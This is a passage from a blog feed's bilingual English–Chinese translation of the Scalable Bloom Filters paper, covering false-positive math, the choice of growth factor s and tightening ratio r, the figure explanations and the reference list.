布隆过滤器的大小，单位比特；</li><li><code>n</code> : 期望写入的元素的数量；</li><li><code>k</code> : 哈希函数的个数，对应单个元素的索引数量；</li><li><code>P</code> : 误判率；</li><li><code>s</code> : 下一个子布隆过滤器容量的增长倍数；</li><li><code>r</code> : 下一个子布隆过滤器的误判率的变化倍数；</li></ul></div><h3 id="3-1、假阳性"><a href="#3-1、假阳性" class="headerlink" title="3.1、假阳性"></a>3.1、假阳性</h3><p>False positives can occur when testing for the presence of a given element <code>x</code>, not present in the filter, and all <code>k</code> bits given by <code>hi(x)</code>, <code>1 ≤ i ≤ k</code>, happen to be set due to the insertion of other elements. Intuitively, if the number of slices <code>k</code> or the slice size <code>m</code> are increased the error probability will decrease.</p><p>当测试（查询）给定元素 <code>x</code> 的是否存在时，如果该元素不存在于过滤器中，但是由于 <code>hi(x)</code> 给出的所有 <code>k</code> 个位置（<code>1 ≤ i ≤ k</code>） 恰好被已经插入的其他元素设置了，则可能发生误报。直观地说，如果切片数量 <code>k</code> 或切片大小 <code>m</code> 增加，将会降低误判的概率。</p><p>The probability of a given bit being set in a slice is the fill ratio <code>p</code> between the number of set bits in the slice and the slice size <code>m</code>. For a large value <code>m</code>, this ratio will be approximately the same across all slices, and the false positive probability <code>P</code> for the filter will be :</p><p>（假设）在切片中设置给定（比特）位的概率是切片中设置位的数量与切片大小 <code>m</code> 之间的填充率 <code>p</code>。 对于较大的值 <code>m</code>，该比率在所有切片中将大致相同，过滤器的误报概率 <code>P</code> 将为：</p><div><p><img src="/assets/images/scalable-bloom-filter-3.png" loading="lazy"></p></div><p>In the example above, with one element inserted, <code>p</code> is <code>1/5</code> and the overall error probability <code>P</code> is <code>(1/5)^3</code> , thus <code>0.8%</code>.</p><p>在上例中，插入一个元素后，<code>p</code>为<code>1/5</code>，总误判率<code>p</code>为<code>（1/5）^3</code>，因此为<code>0.8%</code>。</p><p>In each slice, the probability that a given <code>0</code> bit becomes set after introducing one element is <code>1/m</code>; it will remain unset with probability <code>1 − 1/m</code>. If <code>n</code> elements have been inserted, the probability that the given bit is still <code>0</code> is <code>(1 − 1/m)^n</code>. Therefore, the probability that a specific bit in a slice is set after <code>n</code> insertions, which is also the expected fill ratio <code>p</code>, is:</p><p>在每个切片中，在插入一个元素后给定（比特）位 <code>0</code> 被置的概率是 <code>1/m</code>，未被设置的概率为 <code>1 - 1/m</code> 。 如果已插入 <code>n</code> 个元素，则给定（比特）位仍为 <code>0</code> 的概率为 <code>(1 − 1/m)^n</code>。 因此，在 <code>n</code> 次插入之后，切片中的特定（比特）位被设置的概率，也是预期的填充率 <code>p</code>，为：</p><div><p><img src="/assets/images/scalable-bloom-filter-4.png" loading="lazy"></p></div><h3 id="3-2、限定错误"><a href="#3-2、限定错误" class="headerlink" title="3.2、限定错误"></a>3.2、限定错误</h3><p>From the analysis in the previous section, it is evident that the error probability <code>P</code> increases with <code>n</code> and decreases with <code>m</code> and <code>k</code>. We now determine how to choose <code>k</code> (and thus <code>m</code>) such that, for a given filter size <code>M</code>, we can maximize the number of stored elements <code>n</code>, while keeping the error probability below a certain value <code>P</code>.</p><p>从上一节的分析可以看出，错误概率（误判率） <code>P</code> 随着 <code>n</code> 的增加而增加，随着 <code>m</code> 和 <code>k</code> 的增加而减少。 我们现在确定如何选择 <code>k</code>（因此选择 <code>m</code>），使得对于给定的过滤器大小 <code>M</code>，我们可以最大化存储元素的数量 <code>n</code>，同时将错误概率保持在某个 <code>P</code> 值以下。</p><p>For usable values of <code>m</code>, <code>1−1/m</code> is almost the same as <code>e^(−1/m)</code> (from the Taylor series expansion); we can use this approximation to obtain:</p><p>对于 <code>m</code> 的可用值，<code>1−1/m</code> 与<code>e^(−1/m)</code> 几乎相同（来自泰勒级数展开式）； 我们可以使用这个近似来获得：</p><div><p><img src="/assets/images/scalable-bloom-filter-5.png" loading="lazy"></p></div><p>from which we obtain:</p><p>我们从中获得：</p><div><p><img src="/assets/images/scalable-bloom-filter-6.png" loading="lazy"></p></div><p>From <code>M = km</code> and <code>P = p^k</code> we obtain <code>m = M * ln(p) / ln(P)</code>; therefore:</p><p>从 <code>M = km</code> 和 <code>P = p^k</code> 我们得到 <code>m = M * ln(p) / ln(P)</code>； 所以：</p><div><p><img src="/assets/images/scalable-bloom-filter-7.png" loading="lazy"></p></div><p>For any given error probability <code>P</code> and filter size <code>M</code>, <code>n</code> is maximized by making <code>p = 1/2</code>, regardless of <code>P</code> or <code>M</code>. As <code>p</code> corresponds to the fill ratio of a slice, a filter depicts an optimal use when slices are half full. With <code>p = 1/2</code> we obtain:</p><p>对于任何给定的错误概率（误判率）<code>P</code> 和过滤器大小 <code>M</code>，通过使 <code>p = 1/2</code> 最大化 <code>n</code>，而不管 <code>P</code> 或 <code>M</code>。 由于 <code>p</code> 对应于切片的填充率，因此过滤器描述了切片半满时的最佳使用。 使用<code>p = 1/2</code>，我们得到：</p><div><p><img src="/assets/images/scalable-bloom-filter-8.png" loading="lazy"></p></div><p>In this expression it is clear that the number of elements <code>n</code> that can be stored, for a given error <code>P</code>, is linear on the filter size <code>M</code>. Finally, from <code>P = p^k</code> and with <code>p = 1/2</code> we obtain:</p><p>在这个表达式中，很明显，对于给定的误差 <code>P</code>，可以存储的元素数量 <code>n</code> 与过滤器大小 <code>M</code> 成线性关系。 最后，从 <code>P = p^k</code> 和 <code>p = 1/2</code> 我们得到：</p><div><p><img src="/assets/images/scalable-bloom-filter-10.png" loading="lazy"></p></div><div><p><img src="/assets/images/scalable-bloom-filter-9.png" alt="表1" loading="lazy"></p></div><p>Table 1. Several capacities for a bloom filter with 32 Kilobytes.</p><p>表1. 32KB 的布隆过滤器的几种容量</p><p>With these formulae it is now possible to determine the optimal filter parameters in order to respect a maximum error probability. For example, to have a maximum error of <code>0.1%</code> we should have at least <code>10</code> slices, since <code>log2 * (1 / 0.001) ≈ 9.96 (2^10 = 1024)</code>. If this filter is allocated <code>32</code> kilobytes, each slice will have <code>26214</code> bits and the filter is predicted to hold up to <code>18232</code> elements. See <code>Table 1</code>.</p><p>使用这些公式，为了考虑最大错误概率，可以确定最佳过滤器的参数。 例如，要获得 <code>0.1%</code> 的最大误差，我们应该至少有 <code>10</code> 个切片，因为<code>log2 * (1 / 0.001) ≈ 9.96 (2^10 = 1024)</code>。 如果此过滤器分配了 <code>32</code> 千字节，则每个切片将具有 <code>26214</code> 位，并且预计该过滤器最多可容纳 <code>18232</code> 个元素。 参见 <code>表 1</code>。</p><h2 id="4、可扩展的布隆过滤器"><a href="#4、可扩展的布隆过滤器" class="headerlink" title="4、可扩展的布隆过滤器"></a>4、可扩展的布隆过滤器</h2><p>A Scalable Bloom Filter addresses the problem of having to choose an a priori maximum size for the set, and allows an arbitrary growth of the set being represented. The two key ideas are:</p><p>可扩展的布隆过滤器解决了必须事先为集合确定最大容量大小的问题，并允许对应的集合的大小任意增长。 两个关键思想是：</p><ul><li>A SBF is made up of a series of one or more (plain) Bloom Filters; when filters get full due to the limit on the fill ratio, a new one is added; querying is made by testing for the presence in each filter.</li><li>Each successive bloom filter is created with a tighter maximum error probability on a geometric progression, so that the compounded probability over the whole series converges to some wanted value, even accounting for an infinite series.</li></ul><br /><ul><li>SBF 由一系列一个或多个（普通）布隆过滤器组成； 当过滤器由于填充率的限制而被填满时，会添加一个新的； 查询时会验证元素在每个过滤器的存在。</li><li>每个连续的布隆过滤器都是在几何级数上以更严格的最大错误概率（误判率）创建的，因此整个系列的复合概率收敛到某个想要的值，甚至可以考虑无限系列。</li></ul><p>The SBF starts with one filter with <code>k0</code> slices and error probability <code>P0</code>. When this filter gets full, a new one is added with <code>k1</code> slices and <code>P1 = P0 * r</code> error probability, where <code>r</code> is the tightening ratio with <code>0 &lt; r &lt; 1</code>. At a given moment we will have <code>l</code> filters with error probabilities <code>P0</code>, <code>P0 * r</code>, <code>P0 * r^2</code> , . . . <code>P0 * r^(l−1)</code>. The compounded error probability for the <code>SBF</code> will be:</p><p>SBF 从一个具有 <code>k0</code> 切片和错误概率（误判率） <code>P0</code> 的过滤器开始。当此过滤器已满时，会添加一个带有 <code>k1</code> 切片和 <code>P1 = P0 * r</code> 错误概率（误判率）的新的过滤器，其中 <code>r</code> 是 <code>0 &lt; r &lt; 1</code> 的紧缩比率（缩小比率）。 在给定时刻，我们将有 <code>l</code> 个错误概率（误判率）为 <code>P0</code>，<code>P0 * r</code>，<code>P0 * r^2</code> ， . . .  <code>P0 * r^(l−1)</code>。 <code>SBF</code> 的复合错误概率为：</p><div><p><img src="/assets/images/scalable-bloom-filter-11.png" loading="lazy"></p></div><p>We can use the known approximation:</p><p>我们可以使用已知的近似值：</p><div><p><img src="/assets/images/scalable-bloom-filter-12.png" loading="lazy"></p></div><p>to obtain an upper bound (which will be tight for small <code>Pi</code>):</p><p>获得一个上限（对于小的 <code>Pi</code> 来说会很紧）：</p><div><p><img src="/assets/images/scalable-bloom-filter-13.png" loading="lazy"></p></div><p>and therefore:</p><p>因此：</p><div><p><img src="/assets/images/scalable-bloom-filter-14.png" loading="lazy"></p></div><p>The number of slices for each filter will be:</p><p>每个过滤器的切片数将为：</p><div><p><img src="/assets/images/scalable-bloom-filter-15.png" loading="lazy"></p></div><p>and</p><p>并且</p><div><p><img src="/assets/images/scalable-bloom-filter-16.png" loading="lazy"></p></div><p>To have each <code>ki</code> as an integer, a natural choice will be <code>r = 1/2</code>, resulting in:</p><p>要将每个 <code>ki</code> 作为整数，自然选择将是 <code>r = 1/2</code>，结果是：</p><div><p><img src="/assets/images/scalable-bloom-filter-17.png" loading="lazy"></p></div><p>which means an extra slice per new filter. The compounded error probability for the <code>SBF</code> will be bounded by:</p><p>这意味着每个新过滤器都有一个额外的切片。 <code>SBF</code> 的复合错误概率将受以下限制：</p><div><p><img src="/assets/images/scalable-bloom-filter-18.png" loading="lazy"></p></div><div><p><img src="/assets/images/scalable-bloom-filter-19.png" loading="lazy"></p></div><p>Figure 1. Space usage as a function of set size. Two SBFs, with slice growth factors <code>s = 1</code> and <code>s = 2</code>, are compared with a static bloom. Both with <code>r = 0.5</code>,<code> m0 = 128</code> and <code>P = 10^−6</code> .</p><p>图1.  空间使用量与集合大小的函数关系。 将切片生长因子（布隆过滤器的容量增长倍数） <code>s = 1</code>  和 <code>s = 2</code> 的两个 SBF 与静态布隆过滤器进行比较。 都具有 <code>r = 0.5</code> 、 <code>m0 = 128</code> 和 <code>P = 10^−6</code> 。</p><div><p><strong>图1 内容解析：</strong></p><ul><li>坐标轴信息：<ul><li>横坐标 （set size） ：数据集大小（数量）；</li><li>纵坐标（ABF size in bits）：布隆过滤器的大小，单位比特；</li></ul></li><li>含义解释：<ul><li>静态（普通）布隆过滤器的大小是固定的（根据特定的误判率以及容量确定的），随着数据集的增长，布隆过滤器的大小是没有变化的；</li><li>当可扩展布隆过滤器的增长因子为 <code>1</code> 时，下一个创建的布隆过滤器的容量是前一个的 <code>1倍</code>，随着数据集的增长，布隆过滤器的大小呈现 <code>指数增长</code> 的现象；</li><li>当可扩展布隆过滤器的增长因子为 <code>2</code> 时，下一个创建的布隆过滤器的容量是前一个的 <code>2倍</code>，随着数据集的增长，布隆过滤器的大小呈现 <code>阶梯状增长</code> 的现象；</li></ul></li></ul></div><p>Another possibility is to use an <code>r</code> other than <code>1/2</code> and round up the resulting <code>ki’s</code> to obtain the number of slices. We will see below that choosing <code>r</code> around <code>0.8 – 0.9</code> will result in better average space usage for wide ranges of growth.</p><p>另一种可能性是使用 <code>1/2</code> 以外的 <code>r</code> 并四舍五入得到的 <code>ki&#39;s</code> 以获得切片数。 我们将在下面看到，在 <code>0.8 - 0.9</code> 之间选择 <code>r</code> 将导致更大范围的增长更好的平均空间使用率。</p><h3 id="4-1、可扩展的增长"><a href="#4-1、可扩展的增长" class="headerlink" title="4.1、可扩展的增长"></a>4.1、可扩展的增长</h3><p>The estimation of the set size that is to be stored in a filter may be wrong, possibly by several orders of magnitude. We may also want to use not much more memory than needed at a given time, and start a filter with a small size. Therefore, a <code>SBF</code> should be able to adapt to variations in size of several orders of magnitude in an efficient way.</p><p>预估的存储在过滤器中的集合大小可能是错误的，有可能相差几个数量级。 可能我们还希望在给定时间内使用不超过所需的内存，并启动一个小尺寸的过滤器。 因此，<code>SBF</code> 应该能够以有效的方式适应几个数量级的大小变化。</p><p>When a new filter is added to a <code>SBF</code>, its size can be chosen orthogonally to the required false positive probability. A flexible growth can be obtained by making the filter sizes grow exponentially. We can have a <code>SBF</code> made up of a series of filters with slices having sizes <code>m0</code>, <code>m0 * s</code>, <code>m0 * s^2</code> , . . . , <code>m0 * s^(l−1)</code> .</p><p>当一个新的过滤器被添加到一个 <code>SBF</code> 时，它的大小可以与所需的误报概率正交地选择（正相交？）。 通过使过滤器的大小呈指数增长，可以获得灵活的增长。 我们可以有一个由一系列过滤器组成的 <code>SBF</code>，这些过滤器的切片大小为 <code>m0</code>、<code>m0 * s</code>、<code>m0 * s^2</code>、.. . . , <code>m0 * s^(l−1)</code> 。</p><p>Given that filters stop being used when the fill ratio reaches <code>1/2</code>, filter <code>i</code> will hold approximately:</p><p>鉴于过滤器在填充率达到 <code>1/2</code> 时停止使用，过滤器 <code>i</code> 将保持大约：</p><div><p><img src="/assets/images/scalable-bloom-filter-20.png" loading="lazy"></p></div><p>elements. The <code>SBF</code> with <code>l</code> stages will hold about:</p><p>元素。 具有 <code>l</code> 个阶段的 <code>SBF</code> 将保持大约：</p><div><p><img src="/assets/images/scalable-bloom-filter-21.png" loading="lazy"></p></div><p>elements. This geometric progression allows a fast adaptation to set sizes of different orders of magnitude. A practical choice will be <code>s = 2</code>, which preserves <code>mi</code> as a power of <code>2</code>, if <code>m0</code> already starts as such; this is useful, as the range of a hash function is typically a power of <code>2</code>.</p><p>元素。 这种几何级数允许快速适应不同数量级的设置大小。 一个实际的选择是 <code>s = 2</code>，如果 <code>m0</code> 已经开始这样，它会将 <code>mi</code> 保留为 <code>2</code> 的幂； 这很有用，因为散列函数的范围通常是 <code>2</code> 的幂。</p><p>In general, other values of <code>s</code> may be used. <code>Figure 1</code> shows the required size for the <code>SBF</code> as a function of set size, <code>n</code>, for <code>s = 1</code> and <code>s = 2</code>. The case <code>s = 1</code> gives a constant <code>m</code> in all stages; this case is not feasible as it would lead to much inefficiency, as the number of stages required grows linearly with set size, and in each stage an extra slice would be required (for <code>r = 1/2</code>); this would result in rapidly increasing space per element and computational cost for the hash functions. For <code>s = 2</code> we can see that not only the number of stages remains low, as it increases logarithmically with the set size, but also the space required for the <code>22624</code> element set is only slightly more than for a static filter dimensioned for that size.</p><p>通常，可以使用其他值的<code>s</code>。 <code>图 1</code> 显示了 <code>SBF</code> 所需的大小作为集合大小 <code>n</code> 的函数，对于 <code>s = 1</code> 和 <code>s = 2</code>。 当 <code>s = 1</code> 在所有阶段给出一个常数 <code>m</code>； 这种情况是不可行的，因为它会导致效率低下，因为所需的阶段数会随着集合大小线性增长，并且在每个阶段都需要一个额外的切片（对于 <code>r = 1/2</code>）； 这将导致每个元素的空间和散列函数的计算成本迅速增加。 对于<code>s = 2</code>，我们可以看到不仅阶段数仍然很低，因为它随着集合大小呈对数增加，而且<code>22624</code>元素集所需的空间仅比静态过滤器尺寸略多 对于那个尺寸。</p><div><p><img src="/assets/images/scalable-bloom-filter-22.png" alt="图2" loading="lazy"></p></div><p>Figure 2. Relative space usage with respect to a static filter as a function of set growth. With <code>r = 0.5</code> and <code>P = 10^−6</code> .</p><p>图 2. 相对于静态布隆过滤器的相对空间使用率作为集合增长的函数。 使用 <code>r = 0.5</code> 和 <code>P = 10^−6</code> 。</p><div><p><strong>图2 内容解析：</strong></p><ul><li>坐标轴信息：<ul><li>横坐标 （growth magnitude） ：增长幅度；</li><li>纵坐标（relative space usage）：相对空间使用量，相比静态（普通）布隆过滤器；</li></ul></li><li>含义解释：<ul><li>观察可扩展的布隆过滤器的下一个子布隆过滤器的误判率是上一个的 <code>0.5</code> 倍，并且误判率为 <code>10^-6 = 0.000001</code> 的情况下；</li></ul></li></ul></div><p>To better understand adaptation to growth, we should not plot space usage against an absolute set size, but against the relative growth over the initial size. We should have a scale-free graph telling us how much space will be used according to the orders of magnitude in size the filter has to adapt to. <code>Figure 2</code> plots the space usage relative to a static filter dimensioned for the required size. Here we can see that if the set had to grow by <code>6</code> orders of magnitude, for <code>s = 2</code> the <code>SBF</code> would use about twice the space of a static filter exactly dimensioned for the final size, and for<code>s = 4</code> about <code>50%</code> more space. In terms of space usage we can see that practical values of <code>s</code> like <code>2</code>, <code>4</code> or above can be chosen, and values below <code>2</code> and approaching <code>1</code> will give progressively worse results.</p><p>为了更好地理解对增长的适应，我们不应该根据绝对集合大小绘制空间使用情况，而是针对初始大小的相对增长。 我们应该有一个无标度图，告诉我们根据过滤器必须适应的大小数量级将使用多少空间。 <code>图 2</code> 绘制了相对于所需尺寸的静态过滤器的空间使用情况。 在这里我们可以看到，如果集合必须增长 <code>6</code> 数量级，对于 <code>s = 2</code>，<code>SBF</code> 将使用大约两倍的静态过滤器空间，该静态过滤器的尺寸恰好适合最终尺寸，而对于<code>s = 4</code> 约 <code>50%</code> 更多空间。 在空间使用方面，我们可以看到 <code>s</code> 的实际值可以选择，例如 <code>2</code>、<code>4</code> 或更高，低于 <code>2</code> 和接近 <code>1</code> 的值会产生越来越差的结果。</p><p>Another aspect to consider in the choice of <code>s</code> is the number of stages required for the <code>SBF</code>. <code>Figure 3</code> plots the number of stages as a function of <code>s</code>, for two cases of set growth: <code>10^2</code> and <code>10^6</code>. This figure confirms that <code>s</code> should not be chosen near <code>1</code> and that the practical choice of <code>s</code> as a power of <code>two</code> is a sensible one with this respect.</p><p>在选择 <code>s</code> 时要考虑的另一个方面是 <code>SBF</code> 所需的级数。 <code>图 3</code> 将阶段数绘制为 <code>s</code> 的函数，对于两种集合增长情况：<code>10^2</code> 和 <code>10^6</code>。 这个数字证实了 <code>s</code> 不应该选择在 <code>1</code> 附近，并且在这方面实际选择 <code>s</code> 作为 <code>2</code> 的幂是一个明智的选择。</p><div><p><img src="/assets/images/scalable-bloom-filter-23.png" alt="图 3" loading="lazy"></p></div><p>Figure 3. Number of stages as a function of <code>s</code>.</p><p>图 3. 阶段数作为 <code>s</code> 的函数。</p><div><p><strong>图3 内容解析：</strong></p><ul><li>坐标轴信息：<ul><li>横坐标 （s） ：下一个子布隆过滤器容量的增长倍数；</li><li>纵坐标（l）：子布隆过滤器的数量；</li></ul></li></ul></div><p>From these figures one could be led to think that the larger the <code>s</code> the better. However, as <code>s</code> tends to infinity, each successive stage of the <code>SBF</code> will take considerably more space which will remain poorly used for considerably more time until it gets full. A better criterion is to consider the average space usage over the lifetime of the <code>SBF</code> from an empty set until the final set size. <code>Figure 4</code> plots this average space usage relative to a static filter (dimensioned for the final set size), as a function of <code>s</code>, for several combinations of error probability (<code>10^−3</code> and <code>10^−6</code>) and set growth (<code>10^2</code> and <code>10^6</code> ). These curves cover a wide range of scenarios; they show that, as long as <code>s</code> is not very close to <code>1</code>, increasing <code>s</code> is not profitable.</p><p>从这些数字可以导致人们认为 <code>s</code> 越大越好。 然而，由于 <code>s</code> 趋于无穷大，<code>SBF</code> 的每个连续阶段将占用相当多的空间，这些空间将在相当长的时间内保持不良使用状态，直到它被填满。 更好的标准是考虑 <code>SBF</code> 生命周期内从空集到最终集大小的平均空间使用情况。 <code>图 4</code> 绘制了相对于静态过滤器的平均空间使用情况（根据最终集大小确定），作为 <code>s</code> 的函数，对于错误概率的几种组合（<code>10^−3</code> 和 <code>10^−6 </code>) 并设置增长（<code>10^2</code> 和 <code>10^6</code>）。 这些曲线涵盖了广泛的场景； 他们表明，只要 <code>s</code> 不是很接近 <code>1</code>，增加 <code>s</code> 是无利可图的。</p><div><p><img src="/assets/images/scalable-bloom-filter-24.png" alt="图 4" loading="lazy"></p></div><p>Figure 4. Average relative space usage as a function of <code>s</code>, for different combinations of set growth and <code>P</code>, for optimal <code>r</code>.</p><p>图 4. 对于集合增长和“P”的不同组合，作为 <code>s</code> 函数的平均相对空间使用率，以获得最佳 <code>r</code>。</p><div><p><strong>图4 内容解析：</strong></p><ul><li>坐标轴信息：<ul><li>横坐标 （s） ：下一个子布隆过滤器容量的增长倍数；</li><li>纵坐标（average use ratio）：平均使用率；</li></ul></li></ul></div><p>Combining these two criteria, i.e. average space and number of stages, with the convenience of having a power of <code>two</code>, we can conclude that <code>2</code> or <code>4</code> will be a sensible choice for <code>s</code>. To keep the number of stages small, we can choose <code>s = 2</code> if we expect a small set growth and <code>s = 4</code> if we expect a larger growth.</p><p>结合这两个标准，即平均空间和阶段数，加上 <code>2</code> 的幂的便利性，我们可以得出结论，<code>2</code> 或 <code>4</code> 将是 <code>s</code> 的明智选择。 为了保持阶段的数量较少，如果我们期望小的集合增长，我们可以选择<code>s = 2</code>，如果我们期望更大的增长，我们可以选择<code>s = 4</code>。</p><h3 id="4-2、选择错误判断比例"><a href="#4-2、选择错误判断比例" class="headerlink" title="4.2、选择错误判断比例"></a>4.2、选择错误判断比例</h3><p>The other parameter of a <code>SBF</code> that we need to choose is the error probability ratio <code>r</code>. We can choose values other than <code>0.5</code> and round up the resulting number of slices for stage <code>i</code>:</p><p>我们需要选择的 <code>SBF</code> 的另一个参数是错误概率比 <code>r</code>。 我们可以选择 <code>0.5</code> 以外的值，并对阶段 <code>i</code> 的切片数进行四舍五入：</p><div><p><img src="/assets/images/scalable-bloom-filter-25.png" loading="lazy"></p></div><p><code>Figure 5</code> compares the space usage as a function of set growth for different combinations of <code>P</code> and <code>r</code>. It shows that if we use an <code>r</code> larger than <code>0.5</code>, although we start by using more space (we need more initial slices, <code>k0</code>, as <code>P0</code> needs to be smaller for the geometric series to converge to the same <code>P</code>), after some point we end up using less and less space as the set grows, as we add slices less frequently at each new stage. It specially pays to use a large <code>r</code> for a tighter error probability <code>P</code>, as the few extra slices needed initially will be a small overhead over the already large number of slices needed for <code>r = 0.5</code>.</p><p><code>图 5</code> 比较了 <code>P</code> 和 <code>r</code> 的不同组合的空间使用作为集合增长的函数。 它表明，如果我们使用大于 <code>0.5</code> 的 <code>r</code> ，尽管我们从使用更多空间开始（我们需要更多初始切片， <code>k0</code>，因为 <code>P0</code> 需要更小才能使几何级数收敛到 相同的<code>P</code>），在某个点之后，随着集合的增长，我们最终使用的空间越来越少，因为我们在每个新阶段添加切片的频率越来越低。 使用较大的 <code>r</code> 来获得更严格的错误概率 <code>P</code> 是特别值得的，因为最初需要的几个额外切片将比<code>r = 0.5</code> 所需的已经大量切片的开销小。</p><div><p><img src="/assets/images/scalable-bloom-filter-26.png" alt="图 5" loading="lazy"></p></div><p>Figure 5. Relative space usage as a function of growth, for different combinations of <code>P</code> and <code>r</code> and <code>s = 2</code>.</p><p>图 5. 对于 <code>P</code> 和 <code>r</code> 以及 <code>s = 2</code> 的不同组合，作为增长函数的相对空间使用情况。</p><div><p><strong>图5 内容解析：</strong></p><ul><li>坐标轴信息：<ul><li>横坐标 （growth magnitude） ：增长幅度；</li><li>纵坐标（relative space usage）：相对空间使用量，相比静态（普通）布隆过滤器；</li></ul></li></ul></div><p><code>Figure 4</code> shows average relative space usage, calculated for the optimal <code>r</code> that minimizes average space, for each combination of growth and <code>s</code> values (the optimal <code>r</code> does not depend on <code>P</code>).</p><p><code>图 4</code> 显示了平均相对空间使用情况，为最小化平均空间的最佳 <code>r</code> 计算，对于增长和<code>s</code>值的每个组合（最佳<code>r</code>不依赖于<code>P</code>）。</p><p>In order to select an appropriate value for <code>r</code> we can observe how the optimal <code>r</code> behaves for different growth and s values. <code>Figure 6</code> shows the optimal <code>r</code> as a function of set growth, for three different values of <code>s (√2, 2, 4)</code>. Considering the choice of <code>s = 2</code> for small expected growth and <code>s = 4</code> for larger growth, one can see that <code>r</code> around <code>0.8 – 0.9</code> is a sensible choice, that gives better space usage than the natural <code>r = 1/2</code>.</p><p>为了为 <code>r</code> 选择一个合适的值，我们可以观察最佳 <code>r</code> 对于不同的增长和 s 值的表现。 <code>图 6</code> 显示了最优 <code>r</code> 作为集合增长的函数，对于 <code>s (√2, 2, 4)</code> 的三个不同值。 考虑到较小的预期增长选择 <code>s = 2</code> 和较大增长的 <code>s = 4</code> ，可以看出 <code>r</code> 大约在 <code>0.8 – 0.9</code> 是一个明智的选择，它比自然的 <code> r = 1/2</code>。</p><div><p><img src="/assets/images/scalable-bloom-filter-27.png" alt="图 6" loading="lazy"></p></div><p>Figure 6. Optimal <code>r</code> as a function of growth magnitude, for <code>s ∈ {√ 2, 2, 4}</code> and <code>P = 10^−6</code> .</p><p>图 6. 对于 <code>s ∈ {√ 2, 2, 4}</code> 和 <code>P = 10^−6</code>，最佳 <code>r</code> 作为增长幅度的函数。</p><div><p><strong>图6 内容解析：</strong></p><ul><li>坐标轴信息：<ul><li>横坐标 （growth magnitude） ：增长幅度；</li><li>纵坐标（optimal r）：最优的 <code>r</code> ；</li></ul></li></ul></div><h2 id="5、结论"><a href="#5、结论" class="headerlink" title="5、结论"></a>5、结论</h2><p>Bloom Filters and the existing variants require a priori dimensioning of the maximum size of the set to be stored in the filter. Given that it is not always possible to know in advance how many elements will need to be stored, this leads to over-dimensioning the filters, possibly by several orders of magnitude.</p><p>布隆过滤器和现有变体需要事先确定要存储在过滤器中的集合的最大大小。 考虑到（用户）并不总能提前知道需要存储多少元素，这就会导致布隆过滤器尺寸过大，可能还会增加几个数量级。</p><p>In this paper we have introduced <code>Scalable Bloom Filters (SBF)</code>, a mechanism that allows representing sets without having to know a priori the maximum set size and yet being able to choose from the start the maximum false positive probability. The mechanism adapts to set growth by using a series of classic Bloom Filters of increasing sizes and tighter error probabilities, added as needed.</p><p>在本文中，我们介绍了可扩展的布隆过滤器（SBF），一种允许表示集合的机制，而无需事先知道最大集合大小，并且能够从一开始就选择最大误报概率。 该机制通过使用一系列经典的布隆过滤器来适应集合增长，这些布隆过滤器的大小越来越大，错误概率越来越小，根据需要添加。</p><p>A <code>SBF</code> is parameterized not only by the initial size and error probability but also by the growth rate of the size and by the error probability tightening rate. In this paper we have studied the impact of these parameters on space usage and shown how they can be chosen for a range of scenarios.</p><p><code>SBF</code> 不仅由初始大小和错误概率参数化，而且由大小的增长率和错误概率收紧率参数化。 在本文中，我们研究了这些参数对空间使用的影响，并展示了如何为一系列场景选择它们。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><div><p>[1]. B. H. Bloom, Space&#x2F;time trade-offs in hash coding with allowable errors, Commun. ACM 13 (7) (1970) 422–426.<br>[2]. F. Chang, W. chang Feng, K. Li, Approximate caches for packet classification, in: Proc. of the 23rd Annual Joint Conference of the IEEE Computer and Communications Societies (INFOCOM 2004), IEEE, 2004.<br>[3]. P. Reynolds, A. Vahdat, Efficient peer-to-peer keyword searching., in: M. Endler, D. C. Schmidt (Eds.), Middleware, Vol. 2672 of Lecture Notes in Computer Science, Springer, 2003, pp. 21–40.<br>[4]. S. C. Rhea, J. Kubiatowicz, Probabilistic location and routing., in: Proc. of the 21st Annual Joint Conference of the IEEE Computer and Communications Societies (INFOCOM 2002), 2002.<br>[5]. L. Fan, P. Cao, J. Almeida, A. Z. Broder, Summary cache: a scalable wide-area web cache sharing protocol, IEEE&#x2F;ACM Trans. Netw. 8 (3) (2000) 281–293.<br>[6]. L. F. Mackert, G. M. Lohman, R* optimizer validation and performance evaluation for distributed queries, in: Proceedings of the Twelfth International Conference on Very Large Data Bases (VLDB ’86), Morgan Kaufmann Publishers Inc., San Francisco, CA, USA, 1986, pp. 149–159.<br>[7]. A. Broder, M. Mitzenmacher, Network applications of bloom filters: A survey, in: Proc. of Allerton Conference, 2002.<br>[8]. S. Cohen, Y. Matias, Spectral bloom filters, in: Proceedings of the 2003 ACM SIGMOD international conference on Management of data (SIGMOD ’03), ACM Press, New York, NY, USA, 2003, pp. 241–252.<br>[9]. U. Manber, S. Wu, An algorithm for approximate membership checking with application to password security, Inf. Process. Lett. 50 (4) (1994) 191–197.<br>[10]. S. Dharmapurikar, P. Krishnamurthy, D. E. Taylor, Longest prefix matching using bloom filters, in: Proceedings of the 2003 conference on Applications, technologies, architectures, and protocols for computer communications (SIGCOMM ’03), ACM Press, New York, NY, USA, 2003, pp. 201–212.<br>[11]. M. Mitzenmacher, Compressed bloom filters, IEEE&#x2F;ACM Trans. Netw. 10 (5) (2002) 604–612.<br>[12]. P. Bose, H. Guo, E. Kranakis, A. Maheshwari, P. Morin, J. Morrison, M. Smid, Y. Tang, On the false-positive rate of bloom filters, submitted to Information Processing Letters, available at <a href="http://citeseer.ist.psu.edu/649161.html">http://citeseer.ist.psu.edu/649161.html</a> (2004).</p></div>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 论文 </tag>
            
            <tag> BloomFilter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RedisModule剖析 - RedisBloom</title>
      <link href="/2022/01/01/redismodule-redisbloom/"/>
      <url>/2022/01/01/redismodule-redisbloom/</url>
      
